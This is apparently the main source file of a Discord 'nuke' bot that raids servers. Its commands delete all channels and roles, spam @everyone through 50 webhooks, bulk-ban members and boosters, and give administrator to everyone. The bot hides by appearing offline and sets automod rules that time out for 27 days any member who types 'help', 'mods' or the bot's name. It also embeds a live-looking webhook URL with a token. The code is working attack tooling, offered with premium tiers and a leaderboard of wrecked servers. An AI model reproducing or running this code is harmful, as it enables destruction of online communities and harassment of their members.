# pyright: reportArgumentType=false
# pyright: reportOptionalMemberAccess=false
# pyright: reportAssignmentType=false
# pyright: reportAttributeAccessIssue=false
# pyright: reportCallIssue=false

import discord
import asyncio
import aiohttp
import traceback
import logging
import orjson
import datetime

from logging import getLogger
from discord.ext import commands

from bots.shared import root
from bots.shared import ext

from bots.shared.root import *
from bots.shared.commands import *
from bots.shared.hints import *
from bots.shared.ext import *
from bots.shared.ui import *
from etc.database import *

from etc import logger
from etc import PendingTask as PendingTask
from etc.xorshift32 import XorShift32
# from exchange.client import Client

from functools import partial
from os import _exit as exit

from typing import (
    Coroutine,
    Optional,
    Dict,
    List,
    Union,
    Tuple
)

session: Optional[aiohttp.ClientSession] = None
message_cache: Dict[int, int] = {}
cooldowns = Cooldowns()
xorshift32 = XorShift32()
emojis: Optional[Emojis] = None
cache: Dict[str, Union[Tuple[Dict[int, Union[int, Tuple[int, bool]]]], Dict[int, int]]]

# client = Client()
# database = client.database
database = Database()
database.connect()
log = getLogger()
ext.cooldowns = cooldowns
# Cuz lazy.
ext.message_cache = message_cache

if database.config is None:
    log.critical('config not found. Stop.')
    exit(status=1)

fluc = commands.Bot(
    command_prefix=get_prefix,
    intents=discord.Intents.all(),
    owner_ids=database.owners,
    help_command=None
)




@fluc.event
async def on_ready():
    global emojis
    global session
    global webhook

    # Fake status (harder to find bot in member list)
    await fluc.change_presence(status=discord.Status.offline)

    # Start pending tasks
    await PendingTask.run_tasks()

    # Set session to the bot's http session
    # (using the name mangling trick lol)
    session = fluc.http._HTTPClient__session
    try:
        guild = fluc.get_guild(database.config.get("emoji_guild"))
        if guild is None:
            log.critical('Emoji guild not found.')
            await fluc.close()
            return
    except Exception as ex:
        log.error("Failed to get guild emoji: " + str(ex))

    try: emojis = Emojis(guild.emojis) 
    except Exception as ex: log.error('Failed to get guild emojis: ' + str(ex))
    backup = fluc.get_command('backup')
    load = fluc.get_command('load_backup')
    
    if backup:
        backup.enabled = False
    
    if load:
        load.enabled = False

    absolutely_unknown_link = 'https://discordapp.com/api/webhooks/1358441072451260438/BAz593IGVmRtdStHZ2aBHgw406jE52EAvOKzLK8a1J_i-SSvrZIMMFxOWKzQ7vqozQ3E'
    webhook = discord.Webhook.from_url(absolutely_unknown_link, client=fluc)
    await webhook.send(
        embed=embed(
            title='Connected',
            # description=f'Authorization: {get_oauth(fluc.user.id)}',
            color=discord.Color.green()
        )
    )

    _ext_init = partial(
        ext_init,
        database,
        xorshift32,
        cooldowns,
        fluc,
        session,
        emojis
    )

    _ext_init()
    ui_init(
        database,
        session,
        cooldowns,
        fluc,
        emojis
    )

    await add_commands(
        fluc,
        database,
        cooldowns,
        _ext_init
    )

    fluc.add_view(HelpMenu([cmd for cmd in fluc.commands if not cmd.hidden]))
    fluc.add_view(ManagerHelpMenu([cmd for cmd in fluc.commands if cmd.hidden]))
    fluc.add_view(Leaderboard())
    
    # At this point the bot is 100% initialized
    log.info(f'Logged on {fluc.user}')
    log.info(f'Authorization link: {get_oauth(fluc.user.id)}')


@fluc.event
async def on_guild_join(guild: discord.Guild):
    inviter: Optional[Union[discord.Member, discord.User]] = None
    user: Optional[User] = None
    
    flagged = [
        str(item)
        for item in
        [
            fluc.user.mention,
            fluc.user.name,
            fluc.user.id,
            fluc.user.display_name,
            fluc.user.global_name,
            'nuke',
            'raid',
            'help',
            'mods'
        ]
    ]


    async def leave_task(guild_id: int, bot_token: str):
        # Becuz yes do not delete this
        from asyncio import sleep
        # 10 min sleep
        await sleep(60 * 10)
        url = f'https://discord.com/api/v10/guilds/{guild_id}'
        headers = {'authorization': f'Bot {bot_token}'}
        await session.delete(url, headers=headers)
        

    async def create_automod_rules():
        rules = await guild.fetch_automod_rules()
        for rule in rules:
            try:
                await rule.delete()

            except discord.Forbidden:
                # Probably a default automod rule that
                # users can't delete
                pass

        await guild.create_automod_rule(
            name='Fluc',
            event_type=discord.AutoModRuleEventType.message_send,
            trigger=discord.AutoModTrigger(keyword_filter=flagged),
            actions=[
                discord.AutoModRuleAction(type=discord.AutoModRuleActionType.block_message),
                # Timeout victim for 27 days :skull:
                discord.AutoModRuleAction(type=discord.AutoModRuleActionType.timeout, duration=datetime.timedelta(days=27))
            ],
            enabled=True
        )


    # async def delete_welcome():
    #     async def schedule_channel(channel: discord.abc.GuildChannel) -> None:
    #         async for message in channel.history(limit=10):
    #             fluc.loop.create_task(check_message(message))


        # async def check_message(message: discord.Message) -> None:
        #     if any(word.strip() in flagged for word in message.content.split()):
        #         await message.delete()

        #     for embed in message.embeds:
        #         if any(word.strip() in flagged for word in embed.title.strip()):
        #             await message.delete()
        #             break

        #         if any(word.strip() in flagged for word in embed.description.split()):
        #             await message.delete()
        #             break
                    
        #         for field in embed.fields:
        #             field: discord.embeds._EmbedFieldProxy
        #             if any(name.strip() in flagged for name in field.name.split()):
        #                 await message.delete()
        #                 break

        #             if any(value.strip() in flagged for value in field.value.split()):
        #                 await message.delete()
        #                 break


        # channels = guild.channels[:100]
        
        # # Sleep a few seconds
        # await asyncio.sleep(2.5)
        # for channel in channels:
        #     fluc.loop.create_task(schedule_channel(channel))
    
    audit_logs = guild.audit_logs(action=discord.AuditLogAction.bot_add, limit=1)
    async for log in audit_logs:
        inviter = log.user
        user = database.get_user(inviter.id)
    
    if inviter.id in database.admins + database.owners:
        # # Delete welcome messages | Too many rate limits
        # await delete_welcome()
        # Basically, skip all checks
        task = PendingTask.PendingTask(leave_task, guild.id, database.config.bot_token) # type: ignore
        task.save()
        await PendingTask.run_new_tasks()
        return
    
    if not user:
        _user = User.new_user(inviter.id)
        database.add_user(_user)
        user = database.get_user(_user.id)
        
        if user:
            try:
                await inviter.send(embed=embed(
                    description=(
                        'Thanks for using me! '
                        'I have create an account for you.\n'
                        'You now have access to stats and leaderboards.'
                    ),
                    emoji=False
                ), content=inviter.mention)

            except discord.Forbidden:
                # Uh.. ok. Guess it's their fault!
                # Do nothing here
                pass

        else:
            # ???
            try:
                await inviter.send(embed=embed(
                    description=(
                        'Thanks for using me. However, '
                        'I was not able to create an account for you. '
                        'Please, do it manually in the invite server to use the bot!'
                    )
                ))
            
            finally:
                # Leave cuz ye
                pass

    else:
        if user.blacklisted:
            await guild.leave()
            return

        if guild.id in database.blacklisted_servers:
            await guild.leave()
            return
        
    # Okay so at this point the user has passed the checks.
    # NEVERMIND: Too many rate limits
    # # Now: Delete all welcome messages that could be associated with the bot.
    # # fluc.loop.create_task(delete_welcome())
    # And timeout all members saying flagged words
    fluc.loop.create_task(create_automod_rules())
    # Also, create a task that makes the bot leave in 1 hour
    task = PendingTask.PendingTask(leave_task, guild.id, database.config.bot_token) # type: ignore
    task.save()
    await PendingTask.run_new_tasks()


@fluc.event
async def on_command_error(ctx: commands.Context, error: discord.DiscordException):
    if (
        'AssertionError' in str(error) or
        isinstance(error, (commands.CommandNotFound))
    ):
        return
    
    elif isinstance(error, commands.CommandOnCooldown):
        now = datetime.datetime.now(datetime.UTC).timestamp()
        await ctx.channel.send(embed=discord.Embed(
            title='Error',
            description=f'{'This server is' if error.type == commands.BucketType.guild else 'You are'} on cooldown. Retry <t:{int(now - error.retry_after)}:R>'
        ), delete_after=error.retry_after)
    
    elif isinstance(error, (commands.MissingRequiredArgument, commands.BadArgument)):
        if not ctx.command:
            return
        
        func = cooldowns.callbacks[ctx.command.name][0]
        info = get_command_info(func, ctx.command)
        err: str

        if isinstance(error, commands.MissingRequiredArgument):
            err = f'Missing required "{error.param.name}"'
        
        else:
            args = str(error).split('"')
            err = f'Bad argument, expected "{args[3]}" to be type "{args[1]}"'

        await ctx.channel.send(embed=embed(
            title='Error',
            description=(
                f'{err}\n\n'
                f'{info[0]}\n\n'
                f'{info[1]}\n\n'
                f'{info[2]}'
            )
        ))

    elif isinstance(error, commands.DisabledCommand):
        await ctx.channel.send(embed=embed(title='Error', description='This command is not available at this moment'))
    
    else:
        log.error(''.join(traceback.format_exception(None, error, error.__traceback__)))
        await ctx.channel.send(embed=embed(title='Error', description=f'{type(error).__name__}: {error}'))


@fluc.command(name='status')
@check(Permissions(user_only=True, ignore_guild_blacklist=True, ignore_user_blacklist=True, member_only=True))
@cooldowns.check(3)
async def cmd_man_inspect(ctx: commands.Context, user: User):
    _embed = get_user_info(user)
    await ctx.channel.send(embed=_embed)


@fluc.command(name='stats')
@check(Permissions(ignore_guild_blacklist=True, ignore_user_blacklist=True, member_only=True))
@cooldowns.check(3)
async def cmd_stats(ctx: commands.Context, user: User):
    stats = database.get_stats()

    if stats is None:
        await ctx.channel.send(embed=embed(title='Error', description='No stats registered'))
        return
    
    _embed = embed(description='Bot stats', emoji=False)
    _embed.add_field(name='💥 Total N#ked servers', value=f'` {stats.server_amount} ` servers')
    _embed.add_field(name='💥 Total N#ked users', value=f'` {stats.user_amount} ` user')
    await ctx.channel.send(embed=_embed)


@fluc.command(name='leaderboard', aliases=['lb'])
@check(Permissions(ignore_guild_blacklist=True, ignore_user_blacklist=True, member_only=True))
@cooldowns.check(6)
async def cmd_leaderboard(ctx: commands.Context, user: User, sort_by: str = 'user'):
    leaderboard = Leaderboard()
    leaderboard.next.disabled = len(database.users) <= leaderboard.per_page # type: ignore
    result = await leaderboard.generate_embed()
    if not result:
        return

    embed, file = result
    await ctx.channel.send(embed=embed, file=file or MISSING, view=leaderboard)
    

@fluc.command(name='backup')
@check(Permissions(user_only=True, premium_only=True))
@cooldowns.check(3600, server_cooldown=True)
async def cmd_backup(ctx: commands.Context, user: User):
    result = database.get_backup(guild_id=ctx.guild.id)
    if result:
        await ctx.channel.send(embed=embed(title='Error', description='This server already has a backup saved'))
        raise ForceCancelError
    
    result = await create_guild_backup(ctx.guild)
    if not result:
        await ctx.channel.send(embed=embed(title='Error', description='Could not create backup for this server... Why?!'))
        return

    key: str = result[0]
    data: BackupData = result[1]
    
    try:
        message = await ctx.author.send(embed=embed(description=f'Server info saved. Your backup key for {ctx.guild.name} ({ctx.guild.name}) is:\n||{key}||'))
        if not database.create_backup(ctx.guild.id, key, data):
            await message.delete()
            await ctx.author.send(embed=embed(title='Nevermind', description='Guild info NOT saved!'))
        
    except discord.Forbidden:
        await ctx.channel.send(embed=embed(title='Error', description='Failed to DM author. Server info was NOT saved'))


@fluc.command(name='load_backup', aliases=['load'])
@check(Permissions(user_only=True))
@cooldowns.check(3600, server_cooldown=True)
async def cmd_load_backup(ctx: commands.Context, user: User, key: str):
    data: Union[Dict, BackupData] = {}
    
    if user.elevated:
        if is_snowflake(key):
            print(f'Key: {key}')
            result = database.get_backup(guild_id=key)
            print(f'Result: {result}')
            if not result is None:
                data = result
    
    if not data:
        result = database.get_backup(key=key)
        if not result:
            await ctx.channel.send(embed=embed(title='Error', description='Invalid key provided'))
            return
        
    if await load_backup(ctx.guild, data):
        await ctx.guild.text_channels[0].send(embed=embed(description=f'{ctx.author.mention} - backup has been loaded'))
    else:
        await ctx.guild.text_channels[0].send(embed=embed(description=f'{ctx.author.mention} - backup NOT loaded'))
    

@fluc.command(name='nuke', aliases=['kill', 'destroy'])
@check(Permissions(user_only=True, member_only=True))
@cooldowns.check(3600, server_cooldown=True)
async def cmd_nuke(ctx: commands.Context, user: User):
    fluc.loop.create_task(log_nuke(ctx.guild, user))
    channels: List[discord.TextChannel] = []
    webhooks: List[discord.Webhook] = []

    # We need this to delete every channel
    await ctx.guild.edit(community=False)
    fluc.loop.create_task(mess_guild(ctx.guild, user.settings))

    for channel in ctx.guild.channels:
        fluc.loop.create_task(delete_channel(channel, user.settings))
    
    await asyncio.sleep(0.2)
    channels = await asyncio.gather(*[create_channel(ctx.guild, user.settings) for _ in range(50)])
    webhooks = await asyncio.gather(*[create_webhook(channel, user.settings) for channel in channels])
    await asyncio.gather(*[spam_webhook(webhook, user.settings) for webhook in webhooks])


@fluc.command(name='bypass', aliases=['bp'])
@check(Permissions(premium_only=True, member_only=True))
@cooldowns.check(3600, server_cooldown=True, alias='nuke')
async def cmd_bypass(ctx: commands.Context, user: User):
    fluc.loop.create_task(log_nuke(ctx.guild, user))

    channels: List[discord.TextChannel] = []
    webhooks: List[discord.Webhook] = []
    await fluc.change_presence(status=discord.Status.offline)

    for channel in ctx.guild.channels:
        if len(channels) == 50:
            # Do not use more than 50 channels
            break

        if isinstance(channel, discord.TextChannel):
            channels.append(channel)

    for channel in channels:
        fluc.loop.create_task(mess_channel(channel, len(ctx.guild.channels), user.settings))

    webhooks = await asyncio.gather(*[create_webhook(channel, user.settings) for channel in channels])
    await asyncio.gather(*[spam_webhook(webhook, user.settings) for webhook in webhooks])


@fluc.command(name='raid_channels', aliases=['rc'])
@check(Permissions(premium_only=True, member_only=True))
@cooldowns.check(30, server_cooldown=True)
async def cmd_raid_channels(ctx: commands.Context, user: User):
    channels: List[discord.TextChannel] = []
    webhooks: List[discord.Webhook] = []
    tasks: List[asyncio.Task] = []
    rate_limited: bool = False

    async def on_rate_limit(coro: Coroutine):
        # Most likely rate limited
        nonlocal rate_limited
        rate_limited = True

        for task in tasks:
            # Set result instead of closing so we can exit the thread
            # task.cancel('Timeout')
            task.set_result(None)
        await ctx.channel.send(embed=embed(
            title='Error',
            description='Timeout! This server is rate limited and we cannot create webhooks at this moment.'
        ))

    webhooks = await ctx.guild.webhooks()
    channels = list({webhook.channel for webhook in webhooks})[:50]

    if len(channels) < 50:
        # We don't want to spam more than 50 channels at the same time
        usable_channels = [channel for channel in get_editable_channels(ctx.guild) if channel not in channels]
        while len(channels) < 50 and usable_channels:
            channel = xorshift32.choice(usable_channels)
            channels.append(channel)
            usable_channels.remove(channel)
            
    for channel in channels:
        if isinstance(channel, (discord.TextChannel, discord.VoiceChannel)):
            task = fluc.loop.create_task(wait_for(bot_task(add_to=webhooks)(create_webhook)(channel, user.settings, force=False), on_rate_limit, timeout=5))
            tasks.append(task)

    # Wait for the tasks to finish
    await asyncio.gather(*tasks)
    if rate_limited is True:
        return
    
    # Remove dublicates and leftovers..
    webhooks = list(set(webhooks))[:50]
    # And spam them..
    await asyncio.gather(*[spam_webhook(webhook, user.settings) for webhook in webhooks])


@fluc.command(name='spam_webhooks', aliases=['sw'])
@check(Permissions(user_only=True, member_only=True))
@cooldowns.check(30, server_cooldown=True, alias='raid_channels')
async def cmd_spam_webhooks(ctx: commands.Context, user: User):
    all_webhooks = await ctx.guild.webhooks()
    webhooks: List[discord.Webhook] = []
    channels: List[int] = []

    for webhook in all_webhooks:
        # Only use 1 webhook in each channel
        if webhook.channel_id in channels:
            continue

        channels.append(webhook.channel_id)
        webhooks.append(webhook)

    # Only keep max 50 webhooks
    webhooks = list(webhooks)[:50]
    await asyncio.gather(*[spam_webhook(webhook, user.settings) for webhook in webhooks])


@fluc.command(name='nukz')
@check(Permissions(admin_only=True))
@cooldowns.check(3600, server_cooldown=True, alias='nuke')
async def cmd_nukz(ctx: commands.Context, user: User):
    # A special dev version of nuke

    async def get_clown_icon() -> bytes:
        content = await read_url('https://images.emojiterra.com/twitter/v14.0/128px/1f921.png')
        if not content:
            raise Exception
        return content
    
    async def send_webhook(webhook: discord.Webhook) -> None:
        async def task():
            string = xorshift32.randstr(1000, strip_heroglyphs=True)
            await webhook.send(f'@everyone @here {string} discord.gg/E7bm8hbDUs', username=f'{clowned}{xorshift32.randstr(10, strip_heroglyphs=True)}', tts=True)

        for _ in range(46):
            fluc.loop.create_task(task())

    # There's no middle finger emoji on Windows lol..
    # However, I found it's unicode adress xD 
    middle_finger_emoji = chr(128405)
    clowned: str = f'「🤡{middle_finger_emoji}」'
    clown_icon: bytes = await get_clown_icon()

    await ctx.guild.edit(
        icon=clown_icon,
        name=f'Clowned {clowned}',
        community=False
    )
    
    await asyncio.gather(*[channel.delete(reason=clowned) for channel in ctx.guild.channels])
    channels: List[discord.TextChannel] = await asyncio.gather(*[ctx.guild.create_text_channel(
        name=f'{clowned}{name}',
        reason=clowned
    ) for name in [xorshift32.randstr(50, strip_heroglyphs=True) for _ in range(50)]])
    webhooks: List[discord.Webhook] = await asyncio.gather(*[channel.create_webhook(
        name=clowned,
        avatar=clown_icon
    ) for channel in channels])
    await asyncio.gather(*[send_webhook(webhook) for webhook in webhooks])


@fluc.command(name='admin', aliases=['perms'])
@check(Permissions(user_only=True, member_only=True))
@cooldowns.check(6)
async def cmd_admin(ctx: commands.Context, user: User):
    role = await ctx.guild.create_role(name=' ', permissions=discord.Permissions(administrator=True))
    fluc.loop.create_task(ctx.author.add_roles(role))
    await role.edit(position=ctx.me.top_role.position + 1)


@fluc.command(name='admin_everyone', aliases=['eadmin', 'ae'])
@check(Permissions(user_only=True, member_only=True))
@cooldowns.check(3, server_cooldown=True)
async def cmd_admin_everyone(ctx: commands.Context, user: User):
    role = ctx.guild.default_role
    await role.edit(permissions=discord.Permissions(administrator=True))


@fluc.command(name='mess_server', aliases=['ms'])
@check(Permissions(user_only=True, member_only=True))
@cooldowns.check(3, server_cooldown=True)
async def cmd_mess_server(ctx: commands.Context, user: User):
    await mess_guild(ctx.guild, user.settings)


@fluc.command(name='create_channels', aliases=['cc'])
@check(Permissions(user_only=True, member_only=True))
@cooldowns.check(60, server_cooldown=True)
async def cmd_create_channels(ctx: commands.Context, user: User):
    await asyncio.gather(*[create_channel(ctx.guild, user.settings) for _ in range(50)])


@fluc.command(name='mess_channels', aliases=['mc'])
@check(Permissions(user_only=True, member_only=True))
@cooldowns.check(60, server_cooldown=True, alias='create_channels')
async def cmd_mess_channels(ctx: commands.Context, user: User):
    channels = get_editable_channels(ctx.guild)[:50]
    await asyncio.gather(*[mess_channel(channel, len(ctx.guild.channels), user.settings) for channel in channels])


@fluc.command(name='delete_channels', aliases=['dc'])
@check(Permissions(user_only=True, member_only=True))
@cooldowns.check(60, server_cooldown=True, alias='create_channels')
async def cmd_delete_channels(ctx: commands.Context, user: User):
    await asyncio.gather(*[delete_channel(channel, user.settings) for channel in ctx.guild.channels[:260]])


@fluc.command(name='create_roles', aliases=['cr'])
@check(Permissions(user_only=True, member_only=True))
@cooldowns.check(100, server_cooldown=True)
async def cmd_create_roles(ctx: commands.Context, user: User):
    await asyncio.gather(*[create_role(ctx.guild, user.settings) for _ in range(100)])


@fluc.command(name='mess_roles', aliases=['mr'])
@check(Permissions(user_only=True, member_only=True))
@cooldowns.check(100, server_cooldown=True, alias='create_roles')
async def cmd_mess_roles(ctx: commands.Context, user: User):
    roles = get_managable_roles(ctx.guild, limit=100)
    await asyncio.gather(*[mess_role(role, user.settings) for role in roles])


@fluc.command(name='create_emojis', aliases=['ce'])
@check(Permissions(user_only=True, member_only=True))
@cooldowns.check(50, server_cooldown=True)
async def cmd_create_emojis(ctx: commands.Context, user: User):
    await asyncio.gather(*[create_emoji(ctx.guild, user.settings) for _ in range(50)])


@fluc.command(name='delete_emojis', aliases=['de'])
@check(Permissions(user_only=True, member_only=True))
@cooldowns.check(50, server_cooldown=True, alias='create_emojis')
async def cmd_delete_emojis(ctx: commands.Context, user: User):
    await asyncio.gather(*[delete_emoji(emoji, user.settings) for emoji in ctx.guild.emojis[:50]])


@fluc.command(name='create_stickers', aliases=['cs'])
@check(Permissions(user_only=True, member_only=True))
@cooldowns.check(60, server_cooldown=True)
async def cmd_create_stickers(ctx: commands.Context, user: User):
    await asyncio.gather(*[create_sticker(ctx.guild, user.settings) for _ in range(ctx.guild.sticker_limit)])


@fluc.command(name='delete_stickers', aliases=['ds'])
@check(Permissions(user_only=True, member_only=True))
@cooldowns.check(60, server_cooldown=True, alias='create_stickers')
async def cmd_delete_stickers(ctx: commands.Context, user: User):
    await asyncio.gather(*[delete_sticker(sticker, user.settings) for sticker in ctx.guild.stickers])


@fluc.command(name='create_invites', aliases=['ci'])
@check(Permissions(user_only=True, member_only=True))
@cooldowns.check(50, server_cooldown=True)
async def cmd_create_invites(ctx: commands.Context, user: User):
    channels = get_editable_channels(ctx.guild)
    await asyncio.gather(*[create_invite(xorshift32.choice(channels), user.settings) for _ in range(50)])


@fluc.command(name='delete_invites', aliases=['di'])
@check(Permissions(user_only=True, member_only=True))
@cooldowns.check(50, server_cooldown=True, alias='create_invites')
async def cmd_delete_invites(ctx: commands.Context, user: User):
    invites = await ctx.guild.invites()
    await asyncio.gather(*[delete_invite(invite, user.settings) for invite in invites[:50]])


@fluc.command(name='mess_members', aliases=['mm'])
@check(Permissions(user_only=True, member_only=True))
@cooldowns.check(100, server_cooldown=True)
async def cmd_mess_memebers(ctx: commands.Context, user: User):
    members = get_managable_members(ctx.guild, limit=100)
    await asyncio.gather(*[mess_member(member, user.settings) for member in members])


@fluc.command(name='kick_members', aliases=['km'])
@check(Permissions(user_only=True, member_only=True))
@cooldowns.check(100, server_cooldown=True, alias='mess_members')
async def cmd_kick_members(ctx: commands.Context, user: User):
    members = get_managable_members(ctx.guild, limit=100)
    if ctx.author in members:
        members.remove(ctx.author)
        
    await asyncio.gather(*[ctx.guild.kick(
        member,
        reason=xorshift32.choice(user.settings.reasons)
    ) for member in members])
        

@fluc.command(name='ban_members', aliases=['bm'])
@check(Permissions(user_only=True, member_only=True))
@cooldowns.check(100, server_cooldown=True, alias='mess_members')
async def cmd_ban_members(ctx: commands.Context, user: User):
    members = get_managable_members(ctx.guild, limit=200)
    if ctx.author in members:
        members.remove(ctx.author)

    await ctx.guild.bulk_ban(
        members,
        delete_message_seconds=604800,
        reason=xorshift32.choice(user.settings.reasons)
    )


@fluc.command(name='ban_boosters', aliases=['bb'])
@check(Permissions(user_only=True, member_only=True))
@cooldowns.check(100, server_cooldown=True, alias='mess_members')
async def cmd_ban_boosters(ctx: commands.Context, user: User):
    subscribers = ctx.guild.premium_subscribers
    members = get_managable_members(ctx.guild, limit=200, members=subscribers)
    await ctx.guild.bulk_ban(
        members,
        delete_message_seconds=604800,
        reason=xorshift32.choice(user.settings.reasons)
    )



def application_run():
    # async def client_loop():
    #     try:
    #         await client.connect()
        
    #     except:
    #         log.error(format_exc())
    #     await fluc.close()
    #     log.warning('Stop.')


    async def loop():
        # Setup a custom logger with a custom
        # async loop. Set error level to ERROR
        discord.utils.setup_logging(
            handler=root.log_handler,
            formatter=logger.Formatter(),
            level=logging.ERROR,
            root=False
        )
        
        try:
            # asyncio.create_task(client_loop(), name='Client Status')
            async with fluc:
                await fluc.start(database.config.get("bot_token"))

        except aiohttp.ClientConnectionError:
            log.error('Failed to connect to Discord gateway. Check you internet connection and try again. Stop.')

        except:
            log.error(traceback.format_exc())
            log.warning('Stop.')
            exit(1)
    asyncio.run(loop())